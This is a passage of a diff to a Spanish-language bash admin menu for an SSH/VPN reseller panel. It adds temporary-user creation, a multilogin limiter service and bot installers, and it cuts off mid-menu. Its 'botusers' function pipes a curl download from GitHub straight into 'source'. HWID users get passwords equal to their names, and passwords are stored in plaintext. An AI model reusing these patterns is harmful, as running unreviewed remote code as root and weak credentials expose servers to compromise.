+            s) tempo_seconds_for_script="$num"; tempo_display_formatted="${num} segundos";;
+            m) tempo_seconds_for_script="$((num * 60))"; tempo_display_formatted="${num} minutos";;
+            h) tempo_seconds_for_script="$((num * 3600))"; tempo_display_formatted="${num} horas";;
+            d) tempo_seconds_for_script="$((num * 86400))"; tempo_display_formatted="${num} días";;
+        esac
+    else
+        echo -e "${cor[5]} ⚠️ Formato de validez no reconocido. Usando 1 hora por defecto. ⚠️${cor[0]}"
+        tempo_seconds_for_script="3600"
+        tempo_display_formatted="1 hora (por defecto)"
+        raw_tempoin="1h"
+    fi
+
+    msg -bar
+
+    local create_ok=false
+
+    # === CREACIÓN DEL USUARIO ===
+    # Si es corto (≤32) intenta useradd, si es largo usa método manual
+    if [[ ${#hwid_system_user} -le 32 ]]; then
+        if useradd -M -N -s /bin/false "$hwid_system_user" 2>/dev/null; then
+            (echo "$hwid_system_user"; echo "$hwid_system_user") | passwd "$hwid_system_user" 1>/dev/null 2>/dev/null
+            create_ok=true
+        fi
+    fi
+
+    # Método manual para HWIDs largos o si useradd falló
+    if [[ "$create_ok" != true ]]; then
+        local uid
+        uid=$(awk -F: '$3>=2000 && $3<60000 {print $3}' /etc/passwd 2>/dev/null | sort -n | tail -1)
+        uid=$(( ${uid:-1999} + 1 ))
+        [[ "$uid" -lt 2000 ]] && uid=2000
+        local gid="$uid"
+
+        local hash_pass
+        hash_pass=$(openssl passwd -6 "$hwid_system_user" 2>/dev/null)
+        if [[ -z "$hash_pass" ]]; then
+            hash_pass=$(mkpasswd -m sha-512 "$hwid_system_user" 2>/dev/null || echo "")
+        fi
+        if [[ -z "$hash_pass" ]]; then
+            echo -e "${cor[5]} ⚠️ ERROR: no se pudo generar hash de contraseña (instala openssl) ⚠️${cor[0]}"
+            return
+        fi
+
+        echo "${hwid_system_user}:x:${gid}:" >> /etc/group
+        echo "${hwid_system_user}:x:${uid}:${gid}::/home/${hwid_system_user}:/bin/false" >> /etc/passwd
+
+        local dias_creacion=$(( $(date +%s) / 86400 ))
+        echo "${hwid_system_user}:${hash_pass}:${dias_creacion}:0:99999:7:::" >> /etc/shadow
+        chmod 640 /etc/shadow 2>/dev/null
+
+        if id -u "$hwid_system_user" &>/dev/null || grep -q "^${hwid_system_user}:" /etc/passwd; then
+            create_ok=true
+        fi
+    fi
+
+    if [[ "$create_ok" == true ]]; then
+        # Script de auto-eliminación (compatible con usuarios largos)
+        cat > "/etc/usuariosteste/${hwid_system_user}.sh" << EOF
+#!/bin/bash
+sleep $tempo_seconds_for_script
+uskk=\$(cat /bin/ejecutar/uskill 2>/dev/null || echo 0)
+uskk=\$((uskk + 1))
+echo \$uskk > /bin/ejecutar/uskill
+# Matar procesos del usuario
+pkill -u "${hwid_system_user}" 2>/dev/null
+kill \$(ps -u "${hwid_system_user}" -o pid= 2>/dev/null) 2>/dev/null
+# Eliminar usuario (userdel + limpieza manual por si fue creado con método manual)
+userdel --force "${hwid_system_user}" 2>/dev/null
+sed -i "/^${hwid_system_user}:/d" /etc/passwd /etc/shadow /etc/group 2>/dev/null
+rm -rf /etc/adm-lite/userDIR/${hwid_system_user}
+rm -rf /etc/usuariosteste/${hwid_system_user}.sh
+exit
+EOF
+        
+        chmod +x "/etc/usuariosteste/${hwid_system_user}.sh"
+        # Nombre de sesión de screen truncado si es muy largo (screen tiene límite)
+        local screen_name="${hwid_system_user:0:50}"
+        screen -dmS "${screen_name}" bash "/etc/usuariosteste/${hwid_system_user}.sh"
+
+        clear
+        tput cuu1 && tput dl1 
+        tput cuu1 && tput dl1
+        tput cuu1 && tput dl1
+        msg -bar
+        echo -e "${cor[5]} * Puertas Activas en su Servidor *"
+        ports_
+        msg -bar
+        echo -e "${cor[5]} Host/IP-Address : ${cor[4]}$IP"
+        echo -e "${cor[5]} USUARIO : ${cor[4]}$name"
+        echo -e "${cor[5]} HWID    : ${cor[4]}$hwid"
+        echo -e "${cor[5]} VALIDEZ : ${cor[4]}$tempo_display_formatted"
+        msg -bar
+
+        echo "senha: $name" > "/etc/adm-lite/userDIR/$hwid_system_user"
+        echo "limite: HWID_TEMPORAL" >> "/etc/adm-lite/userDIR/$hwid_system_user"
+        echo "data: $(date '+%Y-%m-%d' -d "@$(( $(date +%s) + tempo_seconds_for_script ))")" >> "/etc/adm-lite/userDIR/$hwid_system_user"
+        echo "hwid_temporal: $hwid" >> "/etc/adm-lite/userDIR/$hwid_system_user"
+        echo "duration_seconds: $tempo_seconds_for_script" >> "/etc/adm-lite/userDIR/$hwid_system_user"
+        echo "creation_timestamp: $(date +%s)" >> "/etc/adm-lite/userDIR/$hwid_system_user"
+        echo "tiempo_validez_display: $tempo_display_formatted" >> "/etc/adm-lite/userDIR/$hwid_system_user" 
+        
+        echo -ne "${cor[2]}"
+        echo -e "           Después de expirar ($tempo_display_formatted) !!!!"
+        echo -e "   Este usuario HWID será desconectado y eliminado."
+        echo -ne "${cor[2]}"
+        msg -bar
+    else
+        echo -e "${cor[5]} ⚠️ ERROR AL REGISTRAR SU HWID | REINTENTE ⚠️${cor[0]}"
+    fi
+
+    return
 }
 
-listar_usuarios () {
-    valid_fun
-    echo -e "\033[1;32m USUARIOS CREADOS"
+
+function criarusuarioteste(){
+    # --- Limpieza de pantalla y encabezado ---
+    clear
+    for i in {1..20}; do tput cuu1 && tput dl1; done
+    meu_ip
     msg -bar
-    for u in $(cut -d: -f1 /etc/passwd); do
-        shell=$(grep "^$u:" /etc/passwd | cut -d: -f7)
-        if [[ "$shell" = "/bin/false" || "$shell" = "/usr/sbin/nologin" ]]; then
-            exp=$(chage -l "$u" | grep "La cuenta expira" | awk '{print $NF}')
-            echo -e "\033[1;37m Usuario: \033[1;32m$u \033[1;37m Exp: \033[1;33m${exp:-nunca}"
+    echo -e "${cor[4]}         CREAR USUARIO SSH TEMPORAL"
+    msg -bar
+
+    # --- 1. PIDE DATOS DE FORMA INTERACTIVA ---
+    echo -e "${cor[5]} Ingrese el nombre del Usuario:"
+    echo -e -n "\033[33m-> \033[0m"
+    read -e nome
+
+    if [[ -z "$nome" ]]; then msg -verm "⚠️ Nombre de usuario no puede estar vacío."; return; fi
+    if [[ "$nome" =~ [^a-zA-Z0-9] ]]; then msg -verm "⚠️ Nombre de usuario solo puede contener letras y números."; return; fi
+    if id "$nome" &>/dev/null; then msg -verm "⚠️ El usuario '$nome' ya existe en el sistema."; return; fi
+
+    echo -e "${cor[5]} Ingrese la contraseña para el usuario '$nome'"
+    read -p "Contraseña: " pass
+    if [[ -z "$pass" ]]; then msg -verm "⚠️ La contraseña no puede estar vacía."; return; fi
+    
+    echo -e "${cor[5]} Duración para el Usuario '$nome'"
+    echo -e "${cor[3]}   Use: m > minutos, h > horas, d > dias (Ej: 30m, 2h, 1d)"
+    read -p "VALIDEZ: " tempoin
+
+    echo -e "${cor[5]} Límite de conexiones para '$nome'"
+    read -p "LIMITE (Default: 1): " limit
+    [[ -z "$limit" ]] && limit="1"
+    
+    # --- 2. Lógica de tiempo unificada ---
+    local tiempo_en_segundos=0; local tiempo_validez_display
+    local unidad=${tempoin: -1}; local cantidad=${tempoin%?}
+    if ! [[ "$cantidad" =~ ^[0-9]+$ ]]; then msg -verm "⚠️ Formato de validez incorrecto."; return; fi
+    case "$unidad" in
+        m) tiempo_en_segundos=$((cantidad * 60)); tiempo_validez_display="$cantidad minutos" ;;
+        h) tiempo_en_segundos=$((cantidad * 3600)); tiempo_validez_display="$cantidad horas" ;;
+        d) tiempo_en_segundos=$((cantidad * 86400)); tiempo_validez_display="$cantidad días" ;;
+        *) msg -verm "⚠️ Unidad de tiempo no válida."; return ;;
+    esac
+
+    # --- INICIO DE LA CORRECCIÓN: Expiración de Seguridad a +2 Días ---
+    
+    # La eliminación real sigue basándose en el tiempo exacto que ingresaste
+    local expiration_ts=$(( $(date +%s) + tiempo_en_segundos ))
+    
+    # La fecha para el sistema ahora se calcula como "hoy + 2 días"
+    local valides_para_sistema=$(date -d "now + 2 days" '+%Y-%m-%d')
+    
+    # --- FIN DE LA CORRECCIÓN ---
+
+    # --- CREACIÓN DEL USUARIO CON VERIFICACIÓN ---
+    useradd -M -N -s /bin/false "$nome" -e "$valides_para_sistema"
+    
+    if [ $? -eq 0 ]; then
+        (echo "$pass"; echo "$pass") | passwd "$nome" &>/dev/null
+        
+        # Guardado de Datos
+        local dir_user="/etc/adm-lite/userDIR"; [[ ! -d "$dir_user" ]] && mkdir -p "$dir_user"
+        local user_file="$dir_user/$nome"
+        echo "senha: $pass" > "$user_file"; echo "limite: $limit" >> "$user_file"; echo "data: $valides_para_sistema" >> "$user_file"; echo "tipo: ssh temporal" >> "$user_file"
+
+        # Programación de la Eliminación con Desconexión Forzada
+        if ! command -v at &>/dev/null; then apt-get install -y at &>/dev/null; fi
+        if ! systemctl is-active --quiet atd; then systemctl enable atd &>/dev/null; systemctl start atd &>/dev/null; fi
+        local deletion_time_str=$(date -d "@$expiration_ts" '+%H:%M %Y-%m-%d')
+        local cleanup_command="pkill -9 -u '$nome' &>/dev/null; /usr/sbin/userdel --force -r '$nome' &>/dev/null; /bin/rm -f '$user_file' &>/dev/null"
+        
+        if at_output=$(echo "$cleanup_command" | at "$deletion_time_str" 2>&1); then
+            msg -verd "Tarea de eliminación automática programada con éxito."
+        else
+            msg -verm "¡ERROR! No se pudo programar la eliminación."
+            msg -ama "Respuesta del sistema 'at': $at_output"
+        fi
+
+        # Mensaje de éxito final
+        clear
+        msg -bar
+        echo -e "${cor[2]}   ✓ USUARIO TEMPORAL CREADO CON ÉXITO ✓"
+        msg -bar
+        echo -e "${cor[5]} USUARIO         : ${cor[4]}$nome"
+        echo -e "${cor[5]} PASSWD          : ${cor[4]}$pass"
+        echo -e "${cor[5]} LIMITE          : ${cor[4]}$limit"
+        echo -e "${cor[5]} VALIDEZ         : ${cor[4]}$tiempo_validez_display"
+        echo -e "${cor[5]} EXPIRA Y SE BORRA EL: ${cor[4]}$(date -d "@$expiration_ts" '+%d/%m/%Y a las %H:%M:%S')"
+        msg -bar
+
+    else
+        msg -verm "¡ERROR GRAVE! No se pudo crear el usuario '$nome' en el sistema."
+    fi
+    return
+}
+
+#USUARIO TEST DE PRUEBA
+net_meter () {
+net_dir="/etc/adm-lite/userDIR/usr_cnx"
+if [ ! -e "$net_dir" ]; then
+echo -e "${cor[5]} Verificación no está activada, o no existe información"
+msg -bar
+return
+fi
+net_cent="/tmp/porcentagem"
+sed -i '/^$/d' $net_dir
+ [[ ! -e "$net_cent" ]] && touch $net_cent
+ while read cent; do
+  echo "$cent" | awk '{print $2}' >> $net_cent
+ done < $net_dir
+ por_cent=$(paste -sd+ $net_cent | bc)
+ rm $net_cent
+bb=$(printf '%-18s' "USO APROXIMADO")
+aa=$(printf '%-19s' "USUARIOS")
+cc=$(printf '%-18s' "CONSUMO TOTAL")
+msg -bar
+echo -e "\033[1;33m $aa $bb $cc"
+msg -bar
+while read u; do
+b=$(printf '%-18s' "$(($(echo $u | awk '{print $2}')/970)) - MB")
+a=$(printf '%-20s' "$(echo $u | awk '{print $1}')")
+[[ "$por_cent" = "0" || "$por_cent" = "" ]] && por_cent="1"
+pip=$(echo $u | awk '{print $2}')
+[[ "$pip" = "" || "$pip" = "0" ]] && pip="1"
+percent_user=$(($pip*100/$por_cent)) > /dev/null 2>&1
+[[ $percent_user = "0" ]] && percent_user="1"
+c=$(printf '%-18s' "$percent_user %%")
+if [ "$(($(echo $u | awk '{print $2}')/970))" -gt "1" ]; then
+echo -e "\033[1;32m $a \033[1;31m$b \033[1;32m$c"
+fi
+done < $net_dir
+[[ "$(cat $net_dir)" = "" ]] && echo -e "${cor[5]} Verificación no está activada, o no existe información"
+msg -bar
+echo -e "${cor[1]}  Controlar Consumo de Cada Usuario Por Separado ${cor[0]}"
+unset net_dir
+#monit_user
+}
+
+
+
+verifi_fun () {
+    while true; do
+        clear
+        msg -bar
+        echo -e "${cor[4]}      CONTROL DE MULTILOGIN - LIMITADOR AVANZADO"
+        msg -bar
+
+        # === ESTADO DEL LIMITADOR ===
+        if [[ -e /etc/systemd/system/killadm.service ]]; then
+            ESTADO="\033[1;32m[ON]"
+            INTERVALO=$(cat /bin/ejecutar/limCHECK 2>/dev/null || echo "120")
+            UNBAN=$(cat /bin/ejecutar/limUNBAN 2>/dev/null || echo "5")
+            echo -e " Estado del Limitador: $ESTADO \033[0m"
+            echo -e " Verificación: \033[1;37mcada ${INTERVALO} segundos\033[0m"
+            echo -e " Bloqueo temporal: \033[1;37m${UNBAN} minutos\033[0m"
+        else
+            ESTADO="\033[1;31m[OFF]"
+            echo -e " Estado del Limitador: $ESTADO \033[0m"
+        fi
+
+        msg -bar
+        echo -e "\033[0;35m [1]\033[1;37m > Activar / Desactivar Limitador"
+        echo -e "\033[0;35m [2]\033[1;37m > Configurar Intervalo de Verificación"
+        echo -e "\033[0;35m [3]\033[1;37m > Configurar Tiempo de Desbloqueo"
+        echo -e "\033[0;35m [0]\033[1;37m > Volver al menú anterior"
+        msg -bar
+        echo -ne "${cor[6]} Seleccione una opción: ${cor[0]}"
+        read opcion
+        echo ""
+
+        case $opcion in
+            1)
+                # === ACTIVAR / DESACTIVAR ===
+                if [[ -e /etc/systemd/system/killadm.service ]]; then
+                    # DESACTIVAR
+                    systemctl stop killadm &>/dev/null
+                    systemctl disable killadm &>/dev/null
+                    rm -f /etc/systemd/system/killadm.service
+                    rm -f /bin/killssh
+                    msg -bar
+                    echo -e "${cor[2]} Limitador DESACTIVADO correctamente."
+                    msg -bar
+                    sleep 2
+                else
+                    # ACTIVAR
+                    clear
+                    msg -bar
+                    echo -e "${cor[4]}          ACTIVAR LIMITADOR DE MULTILOGIN"
+                    msg -bar
+
+                    # --- Intervalo de verificación (lista vertical) ---
+                    echo -e "${cor[5]} Intervalo de verificación:"
+                    echo -e "\033[1;37m [1] > 30 segundos"
+                    echo -e "\033[1;37m [2] > 1 minuto"
+                    echo -e "\033[1;37m [3] > 2 minutos"
+                    echo -e "\033[1;37m [4] > 3 minutos"
+                    echo -e "\033[1;37m [5] > 4 minutos"
+                    echo -ne "${cor[6]} Opción [1-5]: ${cor[0]}"
+                    read tiempo_opc
+
+                    case $tiempo_opc in
+                        1) INTERVALO=30 ;;
+                        2) INTERVALO=60 ;;
+                        3) INTERVALO=120 ;;
+                        4) INTERVALO=180 ;;
+                        5) INTERVALO=240 ;;
+                        *) INTERVALO=120 ;;
+                    esac
+                    echo "$INTERVALO" > /bin/ejecutar/limCHECK
+
+                    # --- Tiempo de desbloqueo (lista vertical) ---
+                    echo ""
+                    echo -e "${cor[5]} Tiempo de bloqueo cuando exceda el límite:"
+                    echo -e "\033[1;37m [1] > 1 minuto"
+                    echo -e "\033[1;37m [2] > 2 minutos"
+                    echo -e "\033[1;37m [3] > 5 minutos"
+                    echo -e "\033[1;37m [4] > 10 minutos"
+                    echo -e "\033[1;37m [5] > 15 minutos"
+                    echo -ne "${cor[6]} Opción [1-5]: ${cor[0]}"
+                    read op_unban
+
+                    case $op_unban in
+                        1) UNBAN_TIME=1 ;;
+                        2) UNBAN_TIME=2 ;;
+                        3) UNBAN_TIME=5 ;;
+                        4) UNBAN_TIME=10 ;;
+                        5) UNBAN_TIME=15 ;;
+                        *) UNBAN_TIME=5 ;;
+                    esac
+                    echo "$UNBAN_TIME" > /bin/ejecutar/limUNBAN
+
+                    echo ""
+                    echo -e "${cor[2]} Configuración guardada:"
+                    echo -e " → Verificación: \033[1;37mcada ${INTERVALO} segundos\033[0m"
+                    echo -e " → Bloqueo por: \033[1;37m${UNBAN_TIME} minutos\033[0m"
+                    msg -bar
+                    sleep 2
+
+                    # Crear script killssh
+                    cat << 'EOF' > /bin/killssh
+#!/bin/bash
+export ADM='/etc/adm-lite/userDIR/'
+
+INTERVALO=$(cat /bin/ejecutar/limCHECK 2>/dev/null || echo 120)
+UNBAN_MIN=$(cat /bin/ejecutar/limUNBAN 2>/dev/null || echo 5)
+
+dropb_count() {
+    local user=$1
+    echo $(ps aux | grep dropbear | grep -v grep | grep "$user" | wc -l)
+}
+
+get_limit() {
+    local user=$1
+    local limit=""
+    if [[ -e "${ADM}${user}" ]]; then
+        limit=$(grep "limite:" "${ADM}${user}" | awk '{print $2}')
+    else
+        local file_hwid=$(grep -l "senha: $user" ${ADM}* 2>/dev/null | head -n 1)
+        [[ -n "$file_hwid" ]] && limit=$(grep "limite:" "$file_hwid" | awk '{print $2}')
+    fi
+    [[ -z "$limit" || "$limit" == "HWID" || "$limit" == "TOKEN" ]] && echo "1" || echo "$limit"
+}
+
+log_file="/root/limiter.log"
+
+while true; do
+    for u in $(awk -F: '$3 >= 900 {print $1}' /etc/passwd | grep -v "nobody"); do
+        max_limit=$(get_limit "$u")
+        ssh_conn=$(ps -u "$u" | grep -c "sshd")
+        drop_conn=$(dropb_count "$u")
+        total=$((ssh_conn + drop_conn))
+
+        if [[ $total -gt $max_limit ]]; then
+    pkill -u "$u" &>/dev/null
+
+    if [[ $(passwd --status "$u" | awk '{print $2}') != "L" ]]; then
+        usermod -L "$u" &>/dev/null
+        
+        # === LOG MEJORADO ===
+        echo "$(date '+%Y-%m-%d %H:%M:%S') | Usuario: $u | BLOQUEADO | Conexiones: $total/$max_limit | Límite original: $max_limit" >> "$log_file"
+
+        # Programar desbloqueo
+        echo "usermod -U $u" | at now + ${UNBAN_MIN} minutes &>/dev/null
+    fi
+fi
+    done
+    sleep $INTERVALO
+done
+EOF
+                    chmod +x /bin/killssh
+
+                    # Crear servicio
+                    cat << EOF > /etc/systemd/system/killadm.service
+[Unit]
+Description=KillLogin Service - PandaHL001
+After=network.target
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/killssh
+Restart=always
+RestartSec=5s
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+                    systemctl daemon-reload
+                    systemctl enable killadm &>/dev/null
+                    systemctl start killadm &>/dev/null
+
+                    msg -bar
+                    echo -e "${cor[2]} LIMITADOR ACTIVADO CORRECTAMENTE"
+                    msg -bar
+                    sleep 2
+                fi
+                ;;
+            2)
+                # Cambiar intervalo de verificación
+                clear
+                msg -bar
+                echo -e "${cor[4]}     CONFIGURAR INTERVALO DE VERIFICACIÓN"
+                msg -bar
+                echo -e "${cor[5]} Seleccione el tiempo de verificación:"
+                echo -e "\033[1;37m [1] > 30 segundos"
+                echo -e "\033[1;37m [2] > 1 minuto"
+                echo -e "\033[1;37m [3] > 2 minutos"
+                echo -e "\033[1;37m [4] > 3 minutos"
+                echo -e "\033[1;37m [5] > 4 minutos"
+                echo -ne "${cor[6]} Opción [1-5]: ${cor[0]}"
+                read nuevo
+
+                case $nuevo in
+                    1) echo "30" > /bin/ejecutar/limCHECK ;;
+                    2) echo "60" > /bin/ejecutar/limCHECK ;;
+                    3) echo "120" > /bin/ejecutar/limCHECK ;;
+                    4) echo "180" > /bin/ejecutar/limCHECK ;;
+                    5) echo "240" > /bin/ejecutar/limCHECK ;;
+                    *) echo "120" > /bin/ejecutar/limCHECK ;;
+                esac
+
+                if [[ -e /etc/systemd/system/killadm.service ]]; then
+                    systemctl restart killadm
+                fi
+                echo -e "${cor[2]} Intervalo actualizado."
+                sleep 2
+                ;;
+            3)
+                # Cambiar tiempo de desbloqueo
+                clear
+                msg -bar
+                echo -e "${cor[4]}     CONFIGURAR TIEMPO DE DESBLOQUEO"
+                msg -bar
+                echo -e "${cor[5]} ¿Cuánto tiempo se bloqueará al usuario?"
+                echo -e "\033[1;37m [1] > 1 minuto"
+                echo -e "\033[1;37m [2] > 2 minutos"
+                echo -e "\033[1;37m [3] > 5 minutos"
+                echo -e "\033[1;37m [4] > 10 minutos"
+                echo -e "\033[1;37m [5] > 15 minutos"
+                echo -ne "${cor[6]} Opción [1-5]: ${cor[0]}"
+                read op
+
+                case $op in
+                    1) echo "1" > /bin/ejecutar/limUNBAN ;;
+                    2) echo "2" > /bin/ejecutar/limUNBAN ;;
+                    3) echo "5" > /bin/ejecutar/limUNBAN ;;
+                    4) echo "10" > /bin/ejecutar/limUNBAN ;;
+                    5) echo "15" > /bin/ejecutar/limUNBAN ;;
+                    *) echo "5" > /bin/ejecutar/limUNBAN ;;
+                esac
+                echo -e "${cor[2]} Tiempo de desbloqueo actualizado."
+                sleep 2
+                ;;
+            0)
+                return
+                ;;
+            *)
+                echo -e "${cor[1]} Opción inválida."
+                sleep 1
+                ;;
+        esac
+    done
+}
+
+
+
+
+
+
+
+
+
+drop_kill () {
+user="$1"
+echo "$user $for_kill"
+    for pid in `$(dropbear_pids | grep "$user" | awk '{print $2}')`; do
+    kill $pid
+    done
+}
+
+botusers() {
+    unset bot_ini
+    _ps=$(ps aux)
+
+    # Comprobar si el bot ya está corriendo
+    PIDGEN=$(echo -e "${_ps}" | grep -v grep | grep "ultimatebot")
+    if [[ -n $PIDGEN ]]; then
+        # Simula que el bot se activó sin preguntar, ejecuta el siguiente código
+        source <(curl -sSL https://raw.githubusercontent.com/karl1999x/PandaScript/main/PandaScript/instalar_bo.sh)
+    else
+        # Comprobar si la carpeta /etc/ADMcgh/bin existe, si no crearla
+        [[ ! -d /etc/ADMcgh/bin ]] && mkdir -p /etc/ADMcgh/bin
+
+        # Descargar el script useradd y darle permisos de ejecución
+        wget -q -O /etc/ADMcgh/bin/useradd https://raw.githubusercontent.com/karl1999x/PandaScript/main/PandaScript/Otros/useradd && chmod +x /etc/ADMcgh/bin/useradd &> /dev/null
+
+        # Crear enlace simbólico si no existe
+        [[ ! -e /usr/bin/add_new_user ]] && ln -s /etc/ADMcgh/bin/useradd /usr/bin/add_new_user
+
+        msg -bar
+        echo -ne "\033[1;97m ¿Deseas Activar el Bot Telegram? [s/n]: "
+        read bot_ini
+        msg -bar
+
+        if [[ $bot_ini =~ ^[sSyY]$ ]]; then
+            # Descargar y ejecutar el instalador del bot
+            source <(curl -sSL https://raw.githubusercontent.com/karl1999x/PandaScript/main/PandaScript/instalar_bo.sh)
+        else
+            echo "No se activó el bot."
+            sleep 1
+        fi
+    fi
+}
+
+
+
+
+v2ray-socket() {
+    local script_path="/usr/bin/v2.sh"
+    local clientes_file="/etc/v2ray/v2clientes.txt"
+
+    
+    wget --no-cache -q -O "$script_path" https://raw.githubusercontent.com/joaquin1444/clientes-v2ray/main/v2.sh
+
+    
+    sudo chmod +x "$script_path"
+
+    
+    if ! grep -q "alias v2=" ~/.bashrc; then
+        echo "alias v2='/usr/bin/v2.sh'" | sudo tee -a ~/.bashrc > /dev/null
+        
+        source ~/.bashrc
+    fi
+
+    
+    if [ ! -f "$clientes_file" ]; then
+        sudo mkdir -p /etc/v2ray
+        sudo touch "$clientes_file"
+    fi
+
+    
+    /usr/bin/./v2.sh
+}
+consul_cli () {
+unset select_name namer nameFX
+dir_user="/etc/adm-lite/userDIR"
+msg -bar  
+select_users 'CONSULTA DATOS DE CLIENTE INDIVIDUAL'
+if [ "$select_name" = "" ]; then
+return
+fi
+namer="$select_name"
+[[ $(cat /etc/adm-lite/userDIR/$namer | grep "limite" | awk '{print $2}') = "HWID" ]] && nameFX="$(cat /etc/adm-lite/userDIR/$u | grep "senha" | awk '{print $2}')" || nameFX=$namer
+[[ $(cat /etc/adm-lite/userDIR/$namer | grep "limite" | awk '{print $2}') = "TOKEN" ]] && nameFX="$(cat /etc/adm-lite/userDIR/$u | grep "senha" | awk '{print $2}')" || nameFX=$namer
+echo -e "${cor[5]} Que opción va a editar de: $namer"
+echo -e "\033[0;35m [\033[0;36m1\033[0;35m]\033[0;31m >${cor[3]} Consultar estado de Usuario: $nameFX"
+echo -e "\033[0;35m [\033[0;36m2\033[0;35m]\033[0;31m >${cor[3]} Reiniciar Usuario: $nameFX"
+msg -bar
+read -p " ESCOJE: " _opt
+if [ "$_opt" = "1" ]; then
+unset limite
+data=$(cat $dir_user/$namer | grep "data" | awk '{print $2}')
+data_sec=$(date +%s)
+data_user=$(chage -l "$namer" |grep -i co |awk -F ":" '{print $2}')
+data_user_sec=$(date +%s --date="$data_user")
+variavel_soma=$(($data_user_sec - $data_sec))
+dias_use=$(($variavel_soma / 86400))
+if [ -z "$limite" ]; then
+limite="null"
+fi
+if [ "$dias_use" -le 0 ]; then 
+echo -e " ✭ Eiii, Malas Noticias ☹!!\n Usuario : $nameFX. Esta Caducado ☹ \n!! Contacta Cliente, Para Renobar su Membresia\n"  | pv -qL 80
+echo -e "${cor[5]} Usuario $nameFX: VENCIDO EL: $data"
+pkill -u $namer
+else
+limite=$(cat $dir_user/$namer | grep "limite" | awk '{print $2}')
+date="$dias_use"
+datexp=$(date "+%d/%m/%Y" -d " + $date days")
+valid=$(date '+%C%y-%m-%d' -d " + $date days")
+echo -e " ✭ SU CLIENTE : $namer, ES VALIDO HASTA -> $data ☺"
+echo -e " ✭ CON 【 $limite 】 CONEXIONES SIMULTANEAS!!. "
+echo -e "${cor[5]}  RENUEVA EN $dias_use DIAS, DISFRUTE SU ESTANCIA!. "
+pkill -u $namer
+fi
+return
+fi
+if [ "$_opt" = "2" ]; then
+echo -e "${cor[5]} CLIENTE REINICIADO EN SUS CONEXIONES"
+pkill -u $namer
+echo -e "     SI QUIERES VOLVER AL MENU, PRESIONA ENTER!."
+read -p " DIGITA 『 ok 』  PARA REINICIAR SERVICIO SSH ▢ TUNNEL : " _ok
+if [ "$_ok" = "ok" ]; then
+echo -ne " \033[1;31m[ ! ] Services dropbear restart"
+service dropbear restart > /dev/null 2>&1
+[[ -e /etc/init.d/dropbear ]] && /etc/init.d/dropbear restart > /dev/null 2>&1 && echo -e "\033[1;32m [OK]" || echo -e "\033[1;31m [FAIL]"
+echo -ne " \033[1;31m[ ! ] Services SSH & STUNNEL4 restart"
+service ssh restart > /dev/null 2>&1
+service sshd restart > /dev/null 2>&1
+[[ -e /etc/init.d/ssh ]] && /etc/init.d/ssh restart > /dev/null 2>&1 && echo -e "\033[1;32m [OK]" || echo -e "\033[1;31m [FAIL]"
+service stunnel4 restart > /dev/null 2>&1
+echo "SERVICIOS REINICIADOS EXITOSAMENTE "  | pv -qL 50
+fi
+return
+fi
+
+
+}
+
+
+
+
+
+
+
+
+fun_time_user () {
+declare -A data
+usr_pids_var="./userDIR"
+user_x="$1"
+if [ -e $usr_pids_var/$user_x.pid2 ]; then
+source $usr_pids_var/$user_x.pid2
+[[ ${data[$user_x]} != +([0-9]) ]] && data[$user_x]="0"
+_data_now=$(date +%s)
+time[$user_x]=$((${_data_now} - ${data[$user_x]}))
+else
+time[$user_x]="0"
+fi
+}
+fun_us() {
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+msg -bar
+echo -e " \033[0;50m      ⚜️   CREADOR DE CUENTAS TIPO   ⚜️ "
+msg -bar
+echo -e " \033[0;35m[\033[0;32m01\033[0;35m] \033[0;33m >\033[0;33m USUARIO TEMPORAL (SSH | HWID)" # Modified description
+echo -e " \033[0;35m[\033[0;32m02\033[0;35m] \033[0;33m >\033[0;33m SSH|NORMAL "
+echo -e " \033[0;35m[\033[0;32m03\033[0;35m] \033[0;33m >\033[0;33m HWID         "
+echo -e " \033[0;35m[\033[0;32m04\033[0;35m] \033[0;33m >\033[0;31m TOKEN "
+msg -bar
+echo -e " \033[0;35m[\033[0;32m05\033[0;35m] \033[0;33m >\033[0;33m MODIFICAR CONTRASEÑA TOKEN "
+msg -bar
+echo -e " \033[0;35m[\033[1;32m00\033[0;35m] \033[0;33m ⇦ $(msg -bra "\e[3;33m[ VOLVER ]\e[0m")"
+msg -bar
+selection=$(selection_fun 6)
+case ${selection} in
+0|00)
+return
+;;
+1|01)
+clear
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    msg -bar
+    echo -e " \033[0;50m      ⚜️   CREAR USUARIO TEMPORAL   ⚜️ "
+    msg -bar
+echo -e " \033[0;35m[\033[0;32m01\033[0;35m] \033[0;33m >\033[0;33m Temporal SSH (Usuario y Contraseña)"
+echo -e " \033[0;35m[\033[0;32m02\033[0;35m] \033[0;33m >\033[0;33m Temporal HWID (Autenticación por HWID)"
+    msg -bar
+    echo -e " \033[0;35m[\033[1;32m00\033[0;35m] \033[0;33m ⇦ $(msg -bra "\e[3;33m[ VOLVER ]\e[0m")"
+    msg -bar
+    sub_selection=$(selection_fun 3) # Max option is 2 (plus 0 for back)
+    case ${sub_selection} in
+        0|00)
+        # No action, just returns to the main fun_us menu
+        ;;
+        1|01)
+        criarusuarioteste
+        ;;
+        2|02)
+        criarusuarioteste_hwid
+        ;;
+        *)
+        echo -e "${cor[5]} ⚠️ OPCIÓN INVÁLIDA ⚠️${cor[0]}"
+        sleep 2
+        ;;
+    esac
+# --- END NEW SUB-MENU ---
+;;
+2|02)
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+function_1
+;;
+3|03)
